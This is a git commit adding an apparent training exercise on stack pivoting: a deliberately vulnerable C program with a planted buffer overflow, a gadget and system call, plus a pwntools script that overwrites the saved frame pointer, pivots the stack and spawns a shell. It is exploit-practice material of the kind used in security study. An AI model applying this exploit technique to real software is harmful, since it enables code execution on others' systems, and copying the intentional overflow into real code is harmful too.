7d4943e78df5bc7a3a78514cb08136d366c50bc9
r888800009 <r888800009@gmail.com>
2022-03-18 18:28:47 +0800

    Add stack-pivoting

---
+++ stack/stack-pivoting.c
@@ -0,0 +1,36 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+// gcc stack-pivoting.c -o stack-pivoting -no-pie -fno-stack-protector
+
+char data[0x600] = {0};
+
+void init() {
+  setvbuf(stdout, NULL, _IONBF, 0);
+  setvbuf(stdin, NULL, _IONBF, 0);
+  setvbuf(stderr, NULL, _IONBF, 0);
+}
+
+int main(int argc, char **argv) {
+  init();
+  char buf[0x8];
+
+  puts("Welcome to the stack-based buffer overflow challenge!");
+  printf("Please enter your data: ");
+  read(0, 0x600 + data, 0x200);
+
+  printf("Please enter your password: ");
+  read(0, buf, 0x18);
+
+  printf("clean rdi, %s!", "rsi");
+  return 0;
+}
+
+void gadgets() { asm("pop %rdi ; ret"); }
+
+void functions() {
+  system("/bin/ls");
+  puts("/bin/sh");
+  gets(NULL);
+}
---
+++ stack/stack-pivoting.py
@@ -0,0 +1,39 @@
+from pwn import *
+
+c = process("./stack-pivoting")
+elf = elf = ELF("./stack-pivoting")
+rop = ROP(elf)
+
+context.log_level = 'debug'
+context.arch = 'amd64'
+context.terminal = ['tmux', 'splitw', '-h']
+#gdb.attach(c)
+
+# ROPgadget --binary stack-pivoting
+leave_ret = rop.find_gadget(['leave', 'ret'])[0]
+pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
+ret_addr = rop.find_gadget(['ret'])[0]
+bin_sh = next(elf.search(b'/bin/sh'))
+# call_system = ?
+print(hex(bin_sh))
+
+# set my own stack
+payload = p64(elf.bss() + 0x100) # 'new_rbp2'
+payload += p64(pop_rdi)
+payload += p64(bin_sh)
+payload += p64(ret_addr)
+#payload += p64(call_system)
+payload += p64(elf.plt['system'])
+payload += p64(elf.bss()) * 3
+c.sendlineafter(":", payload)
+
+# set rbp to symbol[data]
+new_rbp = elf.symbols['data'] + 0x600
+print("new_rbp: " + hex(new_rbp))
+
+# one gadget
+payload = 0x8 * b'A' + p64(new_rbp) + p64(leave_ret)
+c.sendlineafter(":", payload)
+
+c.interactive()
+c.close()
